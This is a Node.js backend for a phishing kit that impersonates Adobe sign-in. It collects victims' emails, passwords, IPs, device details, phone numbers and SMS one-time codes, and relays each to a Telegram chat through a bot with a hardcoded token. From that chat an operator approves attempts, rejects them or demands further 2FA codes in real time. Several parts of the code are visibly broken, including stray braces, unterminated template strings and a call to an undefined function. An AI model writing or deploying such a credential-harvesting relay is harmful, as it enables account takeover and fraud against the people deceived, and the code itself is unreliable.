const express = require('express');
const cors    = require('cors');
const TelegramBot = require('node-telegram-bot-api');
const { v4: uuidv4 } = require('uuid');
const path = require('path');


const BOT_TOKEN   = process.env.BOT_TOKEN   || '8748301916:AAHC09wVDPVG-xLObOvD-k_pAFiu8TnkwAw';
const ADMIN_CHAT  = process.env.ADMIN_CHAT  || '8745609962';
const PORT        = process.env.PORT        || 3000;


const app = express();
app.use(express.json());
app.use(cors());


app.use(express.static(path.join(__dirname, '..', 'frontend')));
app.use(express.static(path.join(__dirname, 'public')));


const sessions = {};




const bot = new TelegramBot(BOT_TOKEN, { polling: true });

bot.on('polling_error', err => console.error('[TG Poll Error]', err.message));


async function notifyLogin(session) {
  const { email, password, name, ip, device, ua } = session;
  const text = 
    `🔔 *New Login Attempt*\n\n` +
    `👤 *Name:* ${name || 'N/A'}\n` +
    `📧 *Email:* ${email}\n` +
    `🔑 *Password:* ${password}\n\n` +
    `📍 *IP:* ${ip}\n` +
    `📱 *Device:* ${device}\n` +
    `🌐 *Browser:* ${ua}`;

  const keyboard = {
    inline_keyboard: [
      [
        { text: '✅ Yes Prompt', callback_data: `approve_${session.id}` },
        { text: '❌ Password Error', callback_data: `deny_${session.id}` }
      ],
      [
        { text: '📱 SMS Code', callback_data: `sms_${session.id}` },
        { text: '🚫 Block', callback_data: `block_${session.id}` }
      ]
    ]
  };

  const msg = await bot.sendMessage(ADMIN_CHAT, text, { 
    parse_mode: 'Markdown', 
    reply_markup: keyboard 
  });
  session.messageId = msg.message_id;}
  } catch (err) {
    console.error('[TG Send Error]', err.message);
    return null;
  }
}


bot.on('callback_query', async (query) => {
  const [sessionId, action] = (query.data || '').split('::');
  const session = sessions[sessionId];

  if (!session) {
    await bot.answerCallbackQuery(query.id, { text: '⚠️ Session expired or not found.' });
    return;
  }

  
  session.status = action;


  const statusLabels = {
    approved:        '✅ Approved — access granted',
    denied:          '❌ Denied — password error shown',
    blocked:         '🚫 Blocked — visitor blocked',
    sms_required:    '📱 SMS Code I requested',
    sms2_required:   '📟 SMS Code II requested',
    number_required: '📞 Number prompt shown',
  };

  const label = statusLabels[action] || action;

  
  try {
    await bot.editMessageText(
      `${query.message.text}\n\n👮 *Action taken:* ${label}`,
      {
        chat_id: ADMIN_CHAT,
        message_id: query.message.message_id,
        parse_mode: 'Markdown',
        reply_markup: { inline_keyboard: [] }
      }
    );
  } catch(_) {}

  await bot.answerCallbackQuery(query.id, { text: label });

  console.log(`[Session ${sessionId}] Status → ${action}`);
});

// When visitor submits SMS code — notify admin
async function notifySMSCode(session, code, codeType) {
  const text =

━━━━━━━━━━━━━
📧 *Email:* \`${session.email}\`
🔢 *Code:* \`${code}\`
📋 *Type:* ${codeType === 'sms2' ? 'SMS Code II' : 'SMS Code I'}
━━━━━━━━━━━━━`;

  const keyboard = {
    inline_keyboard: [[
      { text: '✅ Accept Code',  callback_data: `${session.sessionId}::approved` },
      { text: '❌ Reject Code',  callback_data: `${session.sessionId}::denied`   },
      { text: '📱 Request II',  callback_data: `${session.sessionId}::sms2_required` }
    ]]
  };

  await bot.sendMessage(ADMIN_CHAT, text, { parse_mode: 'Markdown', reply_markup: keyboard });
  session.status = 'pending'; // wait for admin decision again
}


async function notifyPhone(session, phone) {
  const text =

━━━━━━━━━━━━━
📧 *Email:* \`${session.email}\`
📱 *Phone:* \`${phone}\`
━━━━━━━━━━━━━`;

  const keyboard = {
    inline_keyboard: [[
      { text: '✅ Approve',     callback_data: `${session.sessionId}::approved`     },
      { text: '📱 SMS Code I', callback_data: `${session.sessionId}::sms_required` },
      { text: '❌ Deny',       callback_data: `${session.sessionId}::denied`        }
    ]]
  };

  await bot.sendMessage(ADMIN_CHAT, text, { parse_mode: 'Markdown', reply_markup: keyboard });
  session.status = 'pending';
}




app.post('/api/login', async (req, res) => {
  const { email, password, name, ip, device, ua, type } = req.body;

  if (!email || !password) {
    return res.status(400).json({ error: 'Missing fields' });
  }

  const sessionId = uuidv4();
  const session = {
    sessionId,
    email,
    password,
    name: name || null,
    ip: ip || 'Unknown',
    device: device || 'Unknown',
    ua: ua || '',
    type: type || 'login',
    status: 'pending',
    createdAt: Date.now()
  };

  sessions[sessionId] = session;

  
  const messageId = await sendVisitNotification(session);
  session.messageId = messageId;

  console.log(`[New Session] ${sessionId} | ${email} | ${ip}`);
  res.json({ sessionId, status: 'pending' });
});


app.get('/api/session/:id/status', (req, res) => {
  const session = sessions[req.params.id];
  if (!session) return res.status(404).json({ status: 'expired' });

  // Auto-expire after 10 minutes
  if (Date.now() - session.createdAt > 10 * 60 * 1000) {
    delete sessions[req.params.id];
    return res.json({ status: 'expired' });
  }

  res.json({ status: session.status });
});


app.post('/api/session/:id/sms', async (req, res) => {
  const session = sessions[req.params.id];
  if (!session) return res.status(404).json({ error: 'Session not found' });

  const { code } = req.body;
  const codeType = session.status === 'sms2_required' ? 'sms2' : 'sms1';

  await notifySMSCode(session, code, codeType);

  res.json({ ok: true });
});


app.post('/api/session/:id/phone', async (req, res) => {
  const session = sessions[req.params.id];
  if (!session) return res.status(404).json({ error: 'Session not found' });

  const { phone } = req.body;
  await notifyPhone(session, phone);

  res.json({ ok: true });
});


app.get('*', (req, res) => {
  const frontendPath = path.join(__dirname, '..', 'frontend', 'index.html');
  res.sendFile(frontendPath, err => {
    if (err) res.status(404).send('Not found');
  });
});


app.listen(PORT, () => {
  console.log(`
  ╔═══════════════════════════════════════╗
  ║   Adobe Auth Backend — Running!       ║
  ║   http://localhost:${PORT}              ║
  ║   Telegram Bot: @Madtt7bot           ║
  ╚═══════════════════════════════════════╝
  `);
});
